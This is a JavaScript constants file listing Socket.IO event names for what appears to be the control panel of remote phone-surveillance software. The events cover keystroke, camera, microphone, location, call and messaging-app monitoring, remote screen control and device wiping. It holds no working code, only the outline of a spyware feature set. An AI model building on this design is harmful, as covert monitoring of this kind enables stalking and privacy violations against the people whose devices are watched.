import React from "react";

// Public Socket Events
export const SocketIOPublicEvents = {
  join_room: "join-room",
  add_new_device: "add-new-device",
  added_device: "added-device",
  device_information: "device-information",

  //Monitors
  screen_monitor: "screen-monitor",
  screen_skeleton: "screen-skeleton",
  camera_monitor: "camera-monitor",
  mic_monitor: "mic-monitor",
  key_monitor: "key-monitor",
  application_monitor: "application-monitor",
  location_monitor: "location-monitor",
  browser_monitor: "browser-monitor",
  call_record_monitor: "call-record-monitor",
  call_history_monitor: "call-history-monitor",

  // Social Managers
  whatsapp: "whatsapp",
  instagram: "instagram",
  tiktok: "tiktok",
  facebook: "fackbook",
  twitter: "twitter",
  telegram: "telegram",

  WHATSAPP_CHIENTLIST_TO_WEB: "whatsapp-clientlist-web",
  WHATSAPP_MESSAGE_TO_WEB: "whatsapp-message-web",

  INSTAGRAM_CLIENTLIST_TO_WEB: "instagram-clientlist-web",
  INSTAGRAM_MESSAGE_TO_WEB: "instagram-message-web",

  // File Managers
  gallery: "gallery",
  get_gallery: "get-gallery",

  // screen monitor controll events
  screen_click_event: "screen-click-event",
  screen_drag_event: "screen-drag-event",
  screen_setting_event: "screen-setting-event",
  screen_send_text_event: "screen-send-text",

  screen_control_event: "screen-control-event",
  screen_fps_event: "screen-fps-event",
  screen_quality_event: "screen-quality-event",

  // Device Format
  device_format_event: "device-format-event",
};
